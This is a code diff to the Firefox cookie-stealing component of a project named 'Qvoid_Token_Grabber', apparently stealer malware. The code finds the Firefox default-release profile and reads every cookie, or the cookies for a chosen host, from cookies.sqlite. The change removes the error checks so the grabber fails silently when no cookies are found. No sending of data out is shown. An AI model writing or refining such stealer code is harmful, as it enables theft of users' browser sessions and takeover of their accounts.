@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.IO;
 
@@ -13,29 +13,18 @@ namespace Qvoid_Token_Grabber.PasswordGrabbers
 
         public FirefoxGrabber()
         {
+            if (!Directory.Exists(FirefoxProfilesPath))
+                return;
+
             foreach (string folder in Directory.GetDirectories(FirefoxProfilesPath))
                 if (folder.Contains("default-release"))
-                {
                     FirefoxCookiePath = folder + @"\cookies.sqlite";
-                }
-        }
-
-        /// <summary>
-        /// Returns a value depending on if the File "cookies.sqlite" was found
-        /// </summary>
-        /// <returns>true if Cookies was found and false if not</returns>
-        public bool CookiesExists()
-        {
-            if (File.Exists(FirefoxCookiePath))
-                return true;
-            return false;
         }
 
         public List<Cookie> GetCookiesByHostname(string hostName)
         {
             List<Cookie> cookies = new List<Cookie>();
             if (hostName == null) throw new ArgumentNullException("hostName"); // throw ArgumentNullException if hostName is null
-            if (!CookiesExists()) throw new FileNotFoundException("Cant find cookie store", FirefoxCookiePath);  // throw FileNotFoundException if "Chrome\User Data\Default\Cookies" not found
 
             using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={FirefoxCookiePath};pooling=false"))
             using (var cmd = conn.CreateCommand())
@@ -62,7 +51,6 @@ namespace Qvoid_Token_Grabber.PasswordGrabbers
         public List<Cookie> GetAllCookies()
         {
             List<Cookie> cookies = new List<Cookie>();
-            if (!CookiesExists()) throw new FileNotFoundException("Cant find cookie store", FirefoxCookiePath);  // throw FileNotFoundException if cookie Path not found
 
             using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={FirefoxCookiePath};pooling=false"))
             using (var cmd = conn.CreateCommand())
